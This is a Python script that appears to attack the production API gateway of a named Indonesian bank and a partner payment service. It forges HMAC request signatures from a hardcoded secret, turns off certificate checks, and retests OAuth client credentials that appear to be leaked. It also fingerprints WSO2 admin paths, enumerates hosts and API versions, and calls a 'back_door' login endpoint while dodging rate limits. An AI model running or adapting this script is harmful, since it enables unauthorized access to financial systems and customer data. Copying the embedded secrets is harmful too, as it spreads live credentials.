#!/usr/bin/env python3
import hmac, hashlib, json, datetime, urllib.request, ssl

SECRET = "XO8V9VcN08JpAw9QXBpYUlQFmxILm4Cb"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def forge(method, path, body=""):
    now = datetime.datetime.now(datetime.timezone.utc)
    ts = now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{now.microsecond//1000:03d}" + 'Z'
    body_str = "" if body == "" else json.dumps(body)
    h = hashlib.sha256(body_str.encode()).hexdigest()
    msg = f"{method}:{path}:{h}:{ts}"
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {"X-SIGNATURE": sig, "X-TIMESTAMP": ts, "X-PLATFORM": "WEBVIEW", "X-PARTNER-ID": "payuung"}

def req(method, url, headers):
    r = urllib.request.Request(url, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read()[:400].decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:400].decode('utf-8', 'ignore')
    except Exception as e:
        return "ERR", str(e)[:120]

print("== EGRESS IP ==")
try:
    print(urllib.request.urlopen("https://api.ipify.org", timeout=10, context=ctx).read().decode())
except Exception as e:
    print("ipify err", e)

targets = [
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/", "/exp-api-cicilan/1.0/"),
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/cicilan/dashboard", "/exp-api-cicilan/1.0/cicilan/dashboard"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/loan/partner/config", "/exp-api-portal-loan/1.0/loan/partner/config"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/", "/exp-api-portal-loan/1.0/"),
]
for url, path in targets:
    s, b = req("GET", url, {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)", **forge("GET", path)})
    print(f"{s} {path} => {b[:200]}")

print("== PAYUUNG API RETEST (client_credentials) ==")
try:
    data = json.dumps({"client_id":"jgHY8WqE1gZwqEifL9axo9Zo4cik9PDT9DyQy80JdZQ=","client_secret":"ySjvffjjAPkB6EvKv6BTZ7Pwq2sV/R8h/V9HD4MFE4M=","grant_type":"client_credentials"}).encode()
    r = urllib.request.Request("https://api.payuung.com/v2/oauth2/token", data=data, headers={"Content-Type":"application/json"}, method="POST")
    resp = urllib.request.urlopen(r, timeout=20, context=ctx)
    print("payuung token:", resp.status, resp.read()[:150].decode())
except urllib.error.HTTPError as e:
    print("payuung token:", e.code, e.read()[:150].decode())
except Exception as e:
    print("payuung token ERR:", str(e)[:100])



print("== V6: WSO2 FINGERPRINT + VERSI API + HOST LAIN ==")
import socket
# 1. WSO2 fingerprint paths (tanpa signature)
for p in ["/carbon", "/carbon/admin/login.jsp", "/publisher", "/devportal", "/store", "/services", "/admin", "/management", "/api/am/publisher/v4/apis", "/oauth2/token", "/token"]:
    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0"})
    print(f"WSO2? {p} => {s} {b[:90]}")

# 2. Versi API lain (dengan signature)
for path in ["/exp-api-cicilan/2.0/", "/exp-api-portal-loan/2.0/", "/exp-api-cicilan/1.1/", "/exp-api-portal-loan/1.1/", "/exp-api-cicilan/1.0/loan/detail", "/exp-api-portal-loan/1.0/loan/eligibility-check"]:
    h = forge("GET", path)
    s, b = req("GET", "https://apigw-prod.bankina.id" + path, {"User-Agent": "Mozilla/5.0", **h})
    print(f"VER? {path} => {s} {b[:90]}")

# 3. Host Bank Ina lain
for host in ["apigw-dev.bankina.id", "api.bankina.id", "exp-api.bankina.id", "dev-exp-api.bankina.id", "apigw.bankina.id", "gateway.bankina.id"]:
    try:
        ip = socket.gethostbyname(host)
        s, b = req("GET", f"https://{host}/", {"User-Agent": "Mozilla/5.0"})
        print(f"HOST {host} ({ip}) => {s} {b[:80]}")
    except Exception as e:
        print(f"HOST {host} => DNS GAGAL ({str(e)[:40]})")

# 4. back_door dari runner (rate limit bucket baru)
import urllib.error
data = json.dumps({"email":"x@y.com","password":"x","scope":"merchant_user"}).encode()
r = urllib.request.Request("https://api.payuung.com/oauth2/authenticate/back_door", data=data, headers={"Content-Type":"application/json"}, method="POST")
try:
    resp = urllib.request.urlopen(r, timeout=15, context=ctx)
    print("back_door:", resp.status, resp.read()[:150].decode())
except urllib.error.HTTPError as e:
    print("back_door:", e.code, e.read()[:150].decode())
